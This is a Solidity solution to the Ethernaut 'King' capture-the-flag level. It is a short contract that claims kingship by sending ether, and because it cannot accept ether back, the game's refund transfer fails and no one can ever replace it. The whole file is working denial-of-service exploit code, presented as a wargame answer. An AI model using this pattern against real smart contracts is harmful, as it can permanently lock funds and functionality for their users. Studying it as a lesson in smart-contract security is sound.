// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 9. KING
 * @dev Break the game to prevent any new king to take over.
 */

// Simply make sure this contract can't receive ether and it will be impossible to pass the transfer function
// Become the new king, then stay there forever :)
contract Ethernaut_King {
    address private target = 0xAee491172da8198a0bDCDE30455FE379E56d3711; // Replace with your King instance

    function attack() external payable {
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "Transfer failed");
    }
}

// 🎉 Level completed! 🎉
